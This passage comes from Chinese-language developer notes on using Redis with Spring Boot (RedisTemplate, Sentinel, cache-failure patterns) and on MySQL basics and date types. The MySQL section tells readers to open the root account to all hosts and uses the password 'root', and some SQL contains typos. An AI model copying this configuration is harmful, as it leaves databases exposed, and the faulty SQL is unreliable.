ops.get(\"user\");\n\t\tSystem.out.println(user1);\n\t}\n}\n```\n输出：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329133519.png)\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329133529.png)\n\n## 基本操作\n**操作String**\n```java\n@RunWith(SpringRunner.class)\n@SpringBootTest(classes = RedisApplication.class)\nclass RedisApplicationTests {\n\n\t@Autowired\n\tprivate RedisTemplate redisTemplate;\n\n\tpublic void testString(){\n\t\tValueOperations ops = redisTemplate.opsForValue();\n\t\t//添加一条数据\n\t\tops.set(\"name\", \"zhangsan\");\n\n\t\t//获取一条数据\n\t\tString name = (String) ops.get(\"name\");\n\t\tSystem.out.println(name);\n\n\t\t//层级关系，目录形式存储数据\n\t\tops.set(\"user:01\",\"lisi\");\n\n\t\t//添加多条数据\n\t\tMap<String, String> map = new HashMap<>();\n\t\tmap.put(\"age\", \"20\");\n\t\tmap.put(\"address\", \"sh\");\n\t\tops.multiSet(map);\n\n\t\t//获取多条数据\n\t\tList<String> keys = new ArrayList<>();\n\t\tkeys.add(\"name\");\n\t\tkeys.add(\"age\");\n\t\tkeys.add(\"address\");\n\t\tList list = ops.multiGet(keys);\n\t\tlist.forEach(System.out :: println);\n\n\t\t//删除数据\n\t\tops.delete(\"name\");\n\t}\n}\n```\n**操作Hash**\n```java\n\tpublic void testHash(){\n\t\tHashOperations hashOperations = redisTemplate.opsForHash();\n\t\t/**\n\t\t * 添加一条数据\n\t\t * 第一个参数：redis的key\n\t\t * 第二个参数：hash的key\n\t\t * 第三个参数: hash的value\n\t\t */\n\t\thashOperations.put(\"user\", \"name\", \"zhangsan\");\n\n\t\t/**\n\t\t * 获取一条数据\n\t\t * 第一个参数：redis的key\n\t\t * 第二个参数：hash的key\n\t\t */\n\t\thashOperations.get(\"user\", \"name\");\n\n\t\t//添加多条数据\n\t\tMap<String, String> map = new HashMap<>();\n\t\tmap.put(\"age\", \"20\");\n\t\tmap.put(\"address\", \"sh\");\n\t\thashOperations.putAll(\"user\", map);\n\n\t\t//获取多条数据\n\t\tList<String> keys = new ArrayList<>();\n\t\tkeys.add(\"name\");\n\t\tkeys.add(\"age\");\n\t\tkeys.add(\"address\");\n\t\tList user = hashOperations.multiGet(\"user\", keys);\n\t\tuser.forEach(System.out :: println);\n\n\t\t//获取hash类型的所有的数据\n\t\tMap<String, String> entries = hashOperations.entries(\"user\");\n\t\tentries.entrySet().forEach(e -> {\n\t\t\tSystem.out.println(e.getKey() + \"-->\" + e.getValue());\n\t\t});\n\n\t\t//hash的删除数据\n\t\thashOperations.delete(\"user\", \"name\", \"age\");\n\t}\n\n```\n**操作list**\n```java\n\tpublic void testList(){\n\t\tListOperations listOperations = redisTemplate.opsForList();\n\n\t\t//左添加\n\t\tlistOperations.leftPush(\"students\", \"wangwu\");\n\t\tlistOperations.leftPush(\"students\", \"lisi\");\n\n\t\t/**\n\t\t * 左添加\n\t\t * 第一个参数：redis的key\n\t\t * 第二个参数：被左添加的数据\n\t\t * 第三个参数：添加的数据，添加到第二个参数的左边\n\t\t */\n\t\tlistOperations.leftPush(\"students\", \"whz\", \"aaaa\");\n\n\t\t//右添加\n\t\tlistOperations.rightPush(\"students\", \"zhaoliu\");\n\n\t\t//获取数据\n\t\tList list = listOperations.range(\"students\", 0, 2);\n\t\tlist.forEach(System.out :: println);\n\n\t\t//获取总条数\n\t\tLong size = listOperations.size(\"students\");\n\t\tSystem.out.println(size);\n\n\t\t//删除数据\n\t\tlistOperations.remove(\"students\", 1, \"lisi\");\n\n\t\t//左弹出\n\t\tlistOperations.leftPop(\"students\");\n\n\t\t//右弹出\n\t\tlistOperations.rightPop(\"students\");\n\t}\n```\n**操作set**\n```java\n\tpublic void testSet(){\n\t\tSetOperations setOperations = redisTemplate.opsForSet();\n\t\t//添加数据\n\t\tString[] letters = new String[]{\"aaa\", \"bbb\", \"ccc\", \"ddd\", \"eee\"};\n\t\t//setOperations.add(\"letters\", \"aaa\", \"bbb\", \"ccc\", \"ddd\", \"eee\");\n\t\tsetOperations.add(\"letters\", letters);\n\n\t\t//获取数据\n\t\tSet set = setOperations.members(\"letters\");\n\t\tset.forEach(System.out::println);\n\n\t\t//删除数据\n\t\tsetOperations.remove(\"letters\", \"aaa\", \"bbb\");\n\t}\n```\n**操作zset**\n```java\n\tpublic void testZSet(){\n\t\tZSetOperations zSetOperations = redisTemplate.opsForZSet();\n\t\t//添加数据\n\t\tZSetOperations.TypedTuple<Object> objectTypedTuple1 = new DefaultTypedTuple<>(\"zhangsan\", 7D);\n\t\tZSetOperations.TypedTuple<Object> objectTypedTuple2 = new DefaultTypedTuple<>(\"zhangsan\", 5D);\n\t\tZSetOperations.TypedTuple<Object> objectTypedTuple3 = new DefaultTypedTuple<>(\"zhangsan\", 8D);\n\t\tSet<ZSetOperations.TypedTuple<Object>> tuples = new HashSet<>();\n\t\ttuples.add(objectTypedTuple1);\n\t\ttuples.add(objectTypedTuple2);\n\t\ttuples.add(objectTypedTuple3);\n\t\tzSetOperations.add(\"score\", tuples);\n\n\t\t//获取数据\n\t\tSet set = zSetOperations.range(\"score\", 0, 2);\n\t\tset.forEach(System.out :: println);\n\n\t\t//获取大小\n\t\tLong size = zSetOperations.size(\"score\");\n\t\tSystem.out.println(size);\n\t}\n```\n**操作key**\n```java\n\tpublic void testKey(){\n\t\t//获取当前数据所有key\n\t\tSet keys = redisTemplate.keys(\"*\");\n\t\tkeys.forEach(System.out :: println);\n\n\t\tValueOperations ops = redisTemplate.opsForValue();\n\t\t// 添加key的时候设置失效时间\n\t\tops.set(\"code\", \"test\", 30, TimeUnit.SECONDS);\n\n\t\t//给已经存在的key设置失效时间\n\t\tredisTemplate.expire(\"address\", 30, TimeUnit.SECONDS);\n\n\t\t//查看一个key的失效时间\n\t\tLong expire = redisTemplate.getExpire(\"code\");\n\t\tSystem.out.println(expire);\n\t}\n```\n\n## 整合哨兵\n第一种方式：修改配置文件\n```yml\nspring:\n  redis:\n    # Redis服务器地址\n    host: 127.0.0.1\n    # Redis服务器端口\n    port: 6379\n    # Redis服务器密码\n    password: root\n    database: 0\n    # 连接超时时间\n    timeout: 10000ms\n    lettuce:\n      pool:\n        # 最大连接数，默认为8\n        max-active: 1024\n        # 最大连接阻塞等待时间\n        max-wait: 10000ms\n        # 最大空闲连接，默认为8\n        max-idle: 200\n        # 最小空闲连接，默认为0\n        min-idle: 5\n    # 哨兵模式\n    sentinel:\n      # 主节点名称\n      master: mymaster\n      # 节点\n      nodes: 127.0.0.1:6379,127.0.0.1:6380, 127.0.0.1:6381\n```\n\n第二种方式：添加配置类\n```java\n@Bean\npublic RedisSentinelConfiguration redisSentinelConfiguration(){\n    RedisSentinelConfiguration redisSentinelConfiguration =\n            new RedisSentinelConfiguration()\n                .master(\"mymaster\")\n                .sentinel(\"127.0.0.1\", 6379)\n                .sentinel(\"127.0.0.1\", 6380)\n                .sentinel(\"127.0.0.1\", 6381);\n    \n    //设置密码\n    redisSentinelConfiguration.setPassword(\"root\");\n    return redisSentinelConfiguration;\n}\n```\n\n# Redis缓存穿透、缓存击穿和雪崩问题\n**在实际开发中，我们一般是把redis当作缓存来使用**\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329133539.png)\nRedis缓存的使用，极大的提升了应用程序的性能和效率，特别是数据查询方面。但同时，它也带来了一些问题。其中，最要害的问题，就是数据的一致性问题，从严格意义上讲，这个问题无解。如果对数据的一致性要求很高，那么就不能使用缓存。\n另外的一些典型问题就是，缓存穿透、缓存雪崩和缓存击穿。目前，业界也都有比较流行的解决方案。\n\n## Key的过期淘汰机制\nRedis可以对存储在Redis中的缓存数据设置过期时间，比如我们获取的短信验证码一般十分钟过期，我们这时候就需要在验证码存进Redis时添加一个key的过期时间，但是这里有一个需要格外注意的问题就是：**并非key过期时间到了就一定会被Redis给删除。**\n### 定期删除\nRedis 默认是每隔100ms就随机抽取一些设置了过期时间的Key，检查其是否过期，如果过期就删除。为什么是随机抽取而不是检查所有key？因为你如果设置的key成千上万，每100毫秒都将所有存在的key检查一遍，会给CPU带来比较大的压力。\n\n### 惰性删除\n定期删除由于是随机抽取可能会导致很多过期Key到了过期时间并没有被删除。所以用户在从缓存获取数据的时候，redis会检查这个key是否过期了，如果过期就删除这个key。这时候就会在查询的时候将过期key从缓存中清除。\n\n### 内存淘汰机制\n仅仅使用定期删除+惰性删除机制还是会留下一个严重的隐患：如果定期删除留下了很多已经过期的key，而且用户长时间都没有使用过这些过期key，导致过期key无法被惰性删除，从而导致过期key一直堆积在内存里，最终造成Redis内存块被消耗殆尽。那这个问题如何解决呢？这个时候Redis内存淘汰机制应运而生了。Redis内存淘汰机制提供了6种数据淘汰策略：\n- volatile-lru：从已设置过期时间的数据集中挑选最近最少使用的数据淘汰。\n- volatile-ttl：从已设置过期时间的数据集中挑选将要过期的数据淘汰。\n- volatile-random：从已设置过期时间的数据集中任意选择数据淘汰。\n- allkeys-lru：当内存不足以容纳新写入数据时移除最近最少使用的key。\n- allkeys-random：从数据集中任意选择数据淘汰。\n- no-enviction（默认）：当内存不足以容纳新写入数据时，新写入操作会报错。\n\n一般情况下，推荐使用volatile-lru策略，对于配置信息等重要数据，不应该设置过期时间，这样Redis就永远不会淘汰这些重要数据。对于一般数据可以添加一个缓存时间，当数据失效则请求会从DB中获取并重新存入Redis中。\n\n## 缓存击穿\n定义：高并发的情况下，某个热门key突然过期，导致大量请求在Redis未找到缓存数据，进而全部去访问DB请求数据，引起DB压力瞬间增大。\n\n解决方案：缓存击穿的情况下一般不容易造成DB的宕机，只是会造成对DB的周期性压力。对缓存击穿的解决方案一般可以这样：\n- Redis中的数据不设置过期时间，然后在缓存的对象上添加一个属性标识过期时间，每次获取到数据时，校验对象中的过期时间属性，如果数据即将过期，则异步发起一个线程主动更新缓存中的数据。但是这种方案可能会导致有些请求会拿到过期的值，就得看业务能否可以接受，\n- 如果要求数据必须是新数据，则最好的方案则为热点数据设置为永不过期，然后加一个互斥锁保证缓存的单线程写\n\n## 缓存穿透\n定义：缓存穿透是指查询缓存和DB中都不存在的数据。比如通过id查询商品信息，id一般大于0，攻击者会故意传id为-1去查询，由于缓存是不命中则从DB中获取数据，这将会导致每次缓存都不命中数据导致每个请求都访问DB，造成缓存穿透。\n\n解决方案：\n- 利用互斥锁，缓存失效的时候，先去获得锁，得到锁了，再去请求数据库。没得到锁，则休眠一段时间重试\n- 采用异步更新策略，无论key是否取到值，都直接返回。value值中维护一个缓存失效时间，缓存如果过期，异步起一个线程去读数据库，更新缓存。需要做缓存预热（项目启动前，先加载缓存）操作。\n- 提供一个能迅速判断请求是否有效的拦截机制，比如，利用布隆过滤器，内部维护一系列合法有效的key。迅速判断出，请求所携带的Key是否合法有效。如果不合法，则直接返回。\n- 如果从数据库查询的对象为空，也放入缓存，只是设定的缓存过期时间较短，比如设置为60秒。\n\n## 缓存雪崩\n定义：缓存中如果大量缓存在一段时间内集中过期了，这时候会发生大量的缓存击穿现象，所有的请求都落在了DB上，由于查询数据量巨大，引起DB压力过大甚至导致DB宕机。\n\n解决方案：\n- 给缓存的失效时间，加上一个随机值，避免集体失效。如果Redis是集群部署，将热点数据均匀分布在不同的Redis库中也能避免全部失效的问题\n- 使用互斥锁，但是该方案吞吐量明显下降了。\n- 设置热点数据永远不过期。\n- 双缓存。我们有两个缓存，缓存A和缓存B。缓存A的失效时间为20分钟，缓存B不设失效时间。自己做缓存预热操作。然后细分以下几个小点\n  - 从缓存A读数据库，有则直接返回\n  - A没有数据，直接从B读数据，直接返回，并且异步启动一个更新线程。\n  - 更新线程同时更新缓存A和缓存B。\n"
  },
  {
    "title": "./notes/Data/mysql.md",
    "body": "# 基础知识\n## 启动 MySQL 服务\n```SQL\nservice mysql start\nservice mysql stop\nservice mysql status\nservice mysql restart\n```\n\n## 配置mysql允许远程连接的方法\n首先使用`netstat -ano | grep 3306`命令来查看\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220423184902.png)\n\n以上Local Address为`127.0.0.1:3306`,表示mysql-server服务只监听了本机的loopback地址的3306端口(如果某个服务只监听了回环地址，那么只能在本机进行访问，无法通过tcp/ip 协议进行远程访问), 所以此时只能进行本地连接mysql，而不能进行远程连接。\n\n若此时我不是本地以root用户连接mysql(mysql部署在1.117.40.114服务器上)，会报如下错误：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220423191514.png)\n\n为了使mysql-server应用监听本机的所有ip地址，我们需要修改`/etc/mysql/mysql.conf.d/mysqld.cnf`文件，找到`bind-address = 127.0.0.1`, mysql-server通过读取bind-address的值来决定监听本机的什么ip地址。我们可以通过注释掉这句代码来让mysql-server监听本地的所有ip地址。注释掉后，运行`sudo service mysql restart`重启服务，然后执行`netstat -ano | grep 3306`命令，如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220423185752.png)\n\n此时发现Local Address变为来`:::3306`，表示有服务监听了该本机的所有ip地址的3306端口\n\n此时我们向服务器的3306端口发送请求，就能被mysql-server监听到，并做一些处理。但是现在有一个问题就是mysql有用户权限管理，即设置哪些ip能使用什么mysql用户来进行访问。\n\n通过如下可以看到mysql的用户权限管理：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220423190531.png)\n\n以上设置了有哪些主机host能够访问，并且只能以什么用户user访问。\n\n若此时我不是本地以root用户连接mysql，会报如下错误：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220423191415.png)\n\n所以为了能让所有ip能购以user用户来访问，我们可以运行如下语句：\n\n```mysql\nupdate user set host = ’%’ where user = ’root’;\n```\n\nhost为%表示所有ip\n\n设置完成且重启mysql服务后，我可以成功地在从不是本地以root用户连接mysql，如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220423191841.png)\n\n## 创建表\n```sql\ncreate table if not exist user(\n  id int(10) unsigned not null primary key auto_increment,\n\temail char(129) unique,\n\tphone char(129), \n  playtime int(11) not null default 0 comment '游戏时常',\n  streamid char(40) default '0',\n  gender enum('男','女'), -- 枚举类型\n\t-- unique(email, phone), 表级定义\n  -- primary key(id), 表级定义\n  -- primary key(id,email) 复合主键\n\tkey `playtime_index` (`playtime`) USING BTREE, -- 给playtime属性添加普通索引，索引名为playtime_index, 且采用btree方式\n  unique key `phone_unique_index` (`phone`), -- 给phone属性添加唯一索引，索引名未phone_unique_index\n  constranint fk_user_stream foreign key(streamid) references stream_table(id) -- 其中constraint是用来给约束命名的，方便后面通过约束名来删除此约束，此处给外键约束命名为fk_user_stream\n) ENGINE=InnoDB AUTO_INCREMENT=0 default CHARSET=utf8 comment='表注释';\n```\n\n## 查询条件\n| 查询条件            | 谓词                                 |\n| ------------------- | ------------------------------------ |\n| 比较                | =,>,<,>=,<=,!=,<>,!>,!<              |\n| 确定范围            | between and(闭区间)，not between and |\n| 确定集合            | in, not in                           |\n| 字符匹配            | like, not like                       |\n| 空值                | is null, is not null                 |\n| 多重条件(逻辑运算)) | and, or                              |\n```sql\nselect * from employee where salary <> 90000; -- <>等价于!=\n\nselect * from employee where salary between 80000 and 90000; -- 查询salary在[80000, 90000]区间的\nselect * from employee where salary not between 80000 and 90000;\n\nselect * from employee where salary in (85000, 80000);\n\nselect * from employee where name like 'He%'; -- %为匹配任意长度(可以为0)字符串\nselect * from employee where name like 'Ja_n'; -- _为匹配任意单字符\nselect * from employee where name like 'Ja_n%';\nselect * from employee where salary like '90_0'; -- 其中salary为int型，但仍可以使用字符匹配\n\nselect * from employee where salary is not null;\n\nselect * from employee where salary >= 85000 and name like 'Ma%';\n```\n\n# 数据类型\n## int数据类型\n### bigint\n从 -2^63 (-9223372036854775808) 到 2^63-1 (9223372036854775807) 的整型数据（所有数字）。存储大小为 8 个字节。\n\n**bigint已经有长度了，在mysql建表中的length，只是用于显示的位数**\n\n### int\n从 -2^31 (-2,147,483,648) 到 2^31 – 1 (2,147,483,647) 的整型数据（所有数字）。存储大小为 4 个字节。int 的 SQL-92 同义字为 integer。\n\n### smallint\n从 -2^15 (-32,768) 到 2^15 – 1 (32,767) 的整型数据。存储大小为 2 个字节。\n\n### tinyint\n从 0 到 255 的整型数据。存储大小为 1 字节。\n\n## Boolean类型\n### MySQL BOOLEAN数据类型简介\nMySQL没有内置的布尔类型。 但是它使用TINYINT(1)。 为了更方便，MySQL提供BOOLEAN或BOOL作为TINYINT(1)的同义词。\n在MySQL中，0被认为是false，非零值被认为是true。 要使用布尔文本，可以使用常量TRUE和FALSE来分别计算为1和0。 请参阅以下示例：\n```sql\nSELECT true, false, TRUE, FALSE, True, False;\n-- 1 0 1 0 1 0\n```\n执行上面代码，得到以下结果 - \n```sql\nmysql> SELECT true, false, TRUE, FALSE, True, False;\n+------+-------+------+-------+------+-------+\n| TRUE | FALSE | TRUE | FALSE | TRUE | FALSE |\n+------+-------+------+-------+------+-------+\n|    1 |     0 |    1 |     0 |    1 |     0 |\n+------+-------+------+-------+------+-------+\n1 row in set\n```\nMySQL BOOLEAN示例MySQL将布尔值作为整数存储在表中。为了演示，让我们来看下面的tasts表：\n\n```sql\nUSE testdb;\n\nCREATE TABLE tasks (\n    id INT PRIMARY KEY AUTO_INCREMENT,\n    title VARCHAR(255) NOT NULL,\n    completed BOOLEAN\n);\n```\n\n上面创建表语句中，即使将completed列指定为BOOLEAN类型，当显示表定义时，它是却是TINYINT(1)类型，如下所示：\n```sql\nDESCRIBE tasks;\n```\n以下语句向tasts表中插入2行数据：\n```sql\nINSERT INTO tasks(title,completed)\nVALUES('Master MySQL Boolean type',true),\n      ('Design database table',false);\n```\n在将数据保存到布尔列之前，MySQL将其转换为1或0，以下查询从tasks表中检索数据：\n```sql\nSELECT \n    id, title, completed\nFROM\n    tasks; \n\n+----+---------------------------+-----------+\n| id | title                     | completed |\n+----+---------------------------+-----------+\n|  1 | Master MySQL Boolean type |         1 |\n|  2 | Design database table     |         0 |\n+----+---------------------------+-----------+\n2 rows in set\n```\n如上所见， true 和 false 分别被转换为1和0。\n因为Boolean类型是TINYINT(1)的同义词，所以可以在布尔列中插入1和0以外的值。如下示例：\n```sql\nINSERT INTO tasks(title,completed)\nVALUES('Test Boolean with a number',2);\n```\n上面语句，工作正常~，查询tasts表中的数据，如下所示 - \n```sql\nmysql> SELECT \n    id, title, completed\nFROM\n    tasks; \n+----+----------------------------+-----------+\n| id | title                      | completed |\n+----+----------------------------+-----------+\n|  1 | Master MySQL Boolean type  |         1 |\n|  2 | Design database table      |         0 |\n|  3 | Test Boolean with a number |         2 |\n+----+----------------------------+-----------+\n3 rows in set\n```\n如果要将结果输出为true和false，可以使用IF函数，如下所示：\n```sql\nSELECT \n    id, \n    title, \n    IF(completed, 'true', 'false') completed\nFROM\n    tasks;\n```\n执行上面查询语句，得到结果如下所示 - \n```sql\n+----+----------------------------+-----------+\n| id | title                      | completed |\n+----+----------------------------+-----------+\n|  1 | Master MySQL Boolean type  | true      |\n|  2 | Design database table      | false     |\n|  3 | Test Boolean with a number | true      |\n+----+----------------------------+-----------+\n3 rows in set\n```\nMySQL BOOLEAN运算符要在tasts表中获取所有完成的任务，可以执行以下查询：\n```sql\nSELECT \n    id, title, completed\nFROM\n    tasks\nWHERE\n    completed = TRUE;\n```\n执行上面查询语句，得到结果如下所示 - \n```sql\n+----+---------------------------+-----------+\n| id | title                     | completed |\n+----+---------------------------+-----------+\n|  1 | Master MySQL Boolean type |         1 |\n+----+---------------------------+-----------+\n1 row in set\n```\n如您所见，它只返回completed列的值为1的任务。要解决它，必须使用IS运算符：\n```sql\nSELECT \n    id, title, completed\nFROM\n    tasks\nWHERE\n    completed IS TRUE;\n```\n执行上面查询语句，得到结果如下所示 - \n```sql\n+----+----------------------------+-----------+\n| id | title                      | completed |\n+----+----------------------------+-----------+\n|  1 | Master MySQL Boolean type  |         1 |\n|  3 | Test Boolean with a number |         2 |\n+----+----------------------------+-----------+\n2 rows in set\n```\n在这个例子中，我们使用IS运算符来测试一个与布尔值的值。\n要获得待处理(未完成)的任务，请使用IS FALSE或IS NOT TRUE，如下所示：\n```sql\nSELECT \n    id, title, completed\nFROM\n    tasks\nWHERE\n    completed IS NOT TRUE;\n```\n执行上面查询语句，得到结果如下所示 - \n```sql\n+----+-----------------------+-----------+\n| id | title                 | completed |\n+----+-----------------------+-----------+\n|  2 | Design database table |         0 |\n+----+-----------------------+-----------+\n1 row in set\n```\n\n## DATETIME 和 TIMESTAMP\nMySQL 数据库中常见的日期类型有 YEAR、DATE、TIME、DATETIME、TIMESTAMEP。因为业务绝大部分场景都需要将日期精确到秒，所以在表结构设计中，常见使用的日期类型为DATETIME 和 TIMESTAMP。接下来，我就带你深入了解这两种类型，以及它们在设计中的应用实战。\n\n### DATETIME\n类型 DATETIME 最终展现的形式为：`YYYY-MM-DD HH：MM：SS`，固定占用 8 个字节。\n\n从 MySQL 5.6 版本开始，DATETIME 类型支持毫秒，`DATETIME(N)` 中的 N 表示毫秒的精度。\n\n例如，`DATETIME(6)` 表示可以存储 6 位的毫秒值。同时，一些日期函数也支持精确到毫秒，例如常见的函数 NOW、SYSDATE：\n\n```mysql\nql> SELECT NOW(6);\n+----------------------------+\n| NOW(6)                     |\n+----------------------------+\n| 2020-09-14 17:50:28.707971 |\n+----------------------------+\n1 row in set (0.00 sec)\n```\n\n用户可以将 `DATETIME` 初始化值设置为当前时间，并设置自动更新当前时间的属性。例如用户表 `User`有`register_date`、`last_modify_date`两个字段的定义：\n```mysql\nCREATE TABLE User (\n    id BIGINT NOT NULL AUTO_INCREMENT,\n    name VARCHAR(255) NOT NULL,\n    sex CHAR(1) NOT NULL,\n    password VARCHAR(1024) NOT NULL,\n    money INT NOT NULL DEFAULT 0,\n    register_date DATETIME(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6),\n    last_modify_date DATETIME(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6) ON UPDATE CURRENT_TIMESTAMP(6),\n    CHECK (sex = 'M' OR sex = 'F'),\n    PRIMARY KEY(id)\n);\n```\n\n在上面的表`User` 中，列 `register_date` 表示注册时间，`DEFAULT CURRENT_TIMESTAMP` 表示记录插入时，若没有指定时间，默认就是当前时间。\n\n列 `last_modify_date` 表示当前记录最后的修改时间，`DEFAULT CURRENT_TIMESTAMP(6) ON UPDATE CURRENT_TIMESTAMP(6)` 表示每次修改都会修改为当前时间。\n\n这样的设计保证当用户的金钱（money 字段）发生了变更，则`last_modify_date` 能记录最后一次用户金钱发生变更时的时间。来看下面的例子：\n```mysql\nmysql> SELECT name,money,last_modify_date FROM User WHERE name = 'David';\n+-------+-------+----------------------------+\n| name  | money | last_modify_date           |\n+-------+-------+----------------------------+\n| David |   100 | 2020-09-13 08:08:33.898593 |\n+-------+-------+----------------------------+\n1 row in set (0.00 sec)\n\n\nmysql> UPDATE User SET money = money - 1 WHERE name = 'David';\nQuery OK, 1 row affected (0.06 sec)\nRows matched: 1  Changed: 1  Warnings: 0\n\nmysql> SELECT name,money,last_modify_date FROM User WHERE name = 'David';\n+-------+-------+----------------------------+\n| name  | money | last_modify_date           |\n+-------+-------+----------------------------+\n| David |    99 | 2020-09-14 18:29:17.056327 |\n+-------+-------+----------------------------+\n1 row in set (0.00 sec)\n```\n\n可以看到，当用户金额发生修改时，所对应的字段`last_modify_date`也修改成发生变更的时间。\n\n### TIMESTAMP\n除了 `DATETIME`，日期类型中还有一种 `TIMESTAMP` 的时间戳类型，其实际存储的内容为‘`1970-01-01 00:00:00`’到现在的毫秒数。在 MySQL 中，由于类型 `TIMESTAMP` 占用 4 个字节，因此其存储的时间上限只能到‘`2038-01-19 03:14:07`’。\n\n同类型 `DATETIME` 一样，从 MySQL 5.6 版本开始，类型 `TIMESTAMP` 也能支持毫秒。与 `DATETIME` 不同的是，若带有毫秒时，类型 `TIMESTAMP` 占用 7 个字节，而 `DATETIME` 无论是否存储毫秒信息，都占用 8 个字节。\n\n类型 `TIMESTAMP` 最大的优点是可以带有时区属性，因为它本质上是从毫秒转化而来。如果你的业务需要对应不同的国家时区，那么类型 `TIMESTAMP` 是一种不错的选择。比如新闻类的业务，通常用户想知道这篇新闻发布时对应的自己国家时间，那么 `TIMESTAMP` 是一种选择。\n\n另外，有些国家会执行夏令时。根据不同的季节，人为地调快或调慢 1 个小时，带有时区属性的 `TIMESTAMP` 类型本身就能解决这个问题。\n\n参数 `time_zone` 指定了当前使用的时区，默认为 `SYSTEM` 使用操作系统时区，用户可以通过该参数指定所需要的时区。\n\n如果想使用 `TIMESTAMP` 的时区功能，你可以通过下面的语句将之前的用户表 `User` 的注册时间字段类型从 `DATETIME(6)` 修改为 `TIMESTAMP(6)`：\n\n```mysql\nALTER TABLE User \nCHANGE register_date \nregister_date TIMESTAMP(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6);\n```\n\n这时通过设定不同的 `time_zone`，可以观察到不同时区下的注册时间：\n\n```mysql\nmysql> SELECT name,regist er_date FROM User WHERE name = 'David';\n+-------+----------------------------+\n| name  | register_date              |\n+-------+----------------------------+\n| David | 2018-09-14 18:28:33.898593 |\n+-------+----------------------------+\n1 row in set (0.00 sec)\n\nmysql> SET time_zone = '-08:00';\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> SELECT name,register_date FROM User WHERE name = 'David';\n+-------+----------------------------+\n| name  | register_date              |\n+-------+----------------------------+\n| David | 2018-09-14 02:28:33.898593 |\n+-------+----------------------------+\n1 row in set (0.00 sec)\n```\n\n从上述例子中，你可以看到，中国的时区是 `+08:00`，美国的时区是 `-08:00`，因此改为美国时区后，可以看到用户注册时间比之前延迟了 16 个小时。当然了，直接加减时区并不直观，需要非常熟悉各国的时区表。\n\n在 MySQL 中可以直接设置时区的名字，如：\n\n```mysql\nmysql> SET time_zone = 'America/Los_Angeles';\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> SELECT NOW();\n+---------------------+\n| NOW()               |\n+---------------------+\n| 2020-09-14 20:12:49 |\n+---------------------+\n1 row in set (0.00 sec)\n\nmysql> SET time_zone = 'Asia/Shanghai';\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> SELECT NOW();\n+---------------------+\n| NOW()               |\n+---------------------+\n| 2020-09-15 11:12:55 |\n+---------------------+\n1 row in set (0.00 sec)\n```\n\n讲到这儿，想必你已经了解了时间字段类型，接下来我将分享在真实业务设计中如何使用好时间类型。\n\n### DATETIME vs TIMESTAMP vs INT，怎么选？\n\n在做表结构设计时，对日期字段的存储，开发人员通常会有 3 种选择：DATETIME、TIMESTAMP、INT。\n\nINT 类型就是直接存储 `1970-01-01 00:00:00` 到现在的毫秒数，本质和 `TIMESTAMP` 一样，因此用 `INT` 不如直接使用 `TIMESTAMP`。\n\n当然，有些同学会认为 `INT` 比 `TIMESTAMP` 性能更好。但是，由于当前每个 `CPU` 每秒可执行上亿次的计算，所以无须为这种转换的性能担心。更重要的是，在后期运维和数据分析时，使用 INT 存储日期，是会让 DBA 和数据分析人员发疯的，INT的可运维性太差。\n\n也有的同学会热衷用类型 `TIMESTEMP` 存储日期，因为类型 `TIMESTAMP` 占用 4 个字节，比 `DATETIME` 小一半的存储空间。\n\n但若要将时间精确到毫秒，`TIMESTAMP` 要 7 个字节，和 `DATETIME` 8 字节差不太多。另一方面，现在距离 `TIMESTAMP` 的最大值‘`2038-01-19 03:14:07`’已经很近，这是需要开发同学好好思考的问题。\n\n> 总的来说，我建议你使用类型 `DATETIME`。对于时区问题，可以由前端或者服务这里做一次转化，不一定非要在数据库中解决。\n\n\n### 不要忽视 TIMESTAMP 的性能问题\n\n前面已经提及，`TIMESTAMP` 的上限值 `2038` 年很快就会到来，那时业务又将面临一次类似千年虫的问题。另外，`TIMESTAMP` 还存在潜在的性能问题。\n\n虽然从毫秒数转换到类型 `TIMESTAMP` 本身需要的 CPU 指令并不多，这并不会带来直接的性能问题。但是如果使用默认的操作系统时区，则每次通过时区计算时间时，要调用操作系统底层系统函数 `__tz_convert()`，而这个函数需要额外的加锁操作，以确保这时操作系统时区没有修改。所以，当大规模并发访问时，由于热点资源竞争，会产生两个问题。\n\n- 性能不如 `DATETIME`：`DATETIME` 不存在时区转化问题。\n- 性能抖动：海量并发时，存在性能抖动问题。\n\n为了优化 `TIMESTAMP` 的使用，强烈建议你使用显式的时区，而不是操作系统时区。比如在配置文件中显示地设置时区，而不要使用系统时区：\n\n```mysql\n[mysqld]\ntime_zone = \"+08:00\"\n```\n\n最后，通过命令 `mysqlslap` 来测试 `TIMESTAMP`、`DATETIME` 的性能，命令如下：\n\n```shell\n# 比较time_zone为System和Asia/Shanghai的性能对比\nmysqlslap -uroot --number-of-queries=1000000 --concurrency=100 --query='SELECT NOW()'\n```\n\n最后的性能对比如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220417235600.png)\n\n从表中可以发现，显式指定时区的性能要远远好于直接使用操作系统时区。所以，日期字段推荐使用 `DATETIME`，没有时区转化。即便使用 `TIMESTAMP`，也需要在数据库中显式地配置时区，而不是用系统时区。\n\n### 表结构设计规范：每条记录都要有一个时间字段\n\n在做表结构设计规范时，强烈建议你每张业务核心表都增加一个 `DATETIME` 类型的 `last_modify_date` 字段，并设置修改自动更新机制， 即便标识每条记录最后修改的时间。\n\n例如，在前面的表 User 中的字段 `last_modify_date`，就是用于表示最后一次的修改时间：\n\n```mysql\nCREATE TABLE User (\n    id BIGINT NOT NULL AUTO_INCREMENT,\n    name VARCHAR(255) NOT NULL,\n    sex CHAR(1) NOT NULL,\n    password VARCHAR(1024) NOT NULL,\n    money INT NOT NULL DEFAULT 0,\n    register_date DATETIME(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6),\n    last_modify_date DATETIME(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6) ON UPDATE CURRENT_TIMESTAMP(6),\n    CHECK 